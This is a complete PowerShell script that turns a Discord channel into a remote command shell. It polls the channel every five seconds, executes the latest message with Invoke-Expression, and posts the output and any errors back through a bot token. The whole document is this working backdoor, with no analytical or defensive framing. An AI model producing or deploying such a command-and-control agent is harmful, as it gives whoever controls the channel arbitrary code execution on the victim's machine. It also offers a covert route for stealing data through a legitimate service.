param (
    [string]$Token,
    [string]$ChannelID
)

$Header = @{ Authorization = "Bot $Token" }
$BaseURL = "https://discord.com/api/v10/channels/$ChannelID/messages"

function Send-DiscordMessage {
    param (
        [string]$msg
    )
    $body = @{ content = $msg } | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $BaseURL -Method Post -Headers $Header -Body $body -ContentType "application/json"
}

function Get-LastCommand {
    $response = Invoke-RestMethod -Uri $BaseURL -Headers $Header -Method Get
    return $response[0].content
}

$lastCommand = ""

while ($true) {
    try {
        $command = Get-LastCommand
        if ($command -ne $lastCommand -and $command -notmatch "^!") {
            $output = Invoke-Expression $command | Out-String
            Send-DiscordMessage -msg "```\n$output`n```"
            $lastCommand = $command
        }
    }
    catch {
        $errMsg = "ERROR: $($_.Exception.Message)"
        Send-DiscordMessage -msg $errMsg
    }
    Start-Sleep -Seconds 5
}
